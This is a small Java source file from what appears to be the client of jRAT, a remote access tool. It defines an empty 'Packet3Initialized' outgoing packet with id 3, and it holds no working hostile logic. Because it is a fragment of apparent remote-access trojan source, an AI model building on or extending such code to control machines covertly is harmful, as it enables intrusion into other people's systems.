package jrat.client.packets.outgoing;

import jrat.client.Connection;

public class Packet3Initialized extends AbstractOutgoingPacket {

	@Override
	public void write(Connection dos) throws Exception {
		
	}

	@Override
	public short getPacketId() {
		return 3;
	}

}
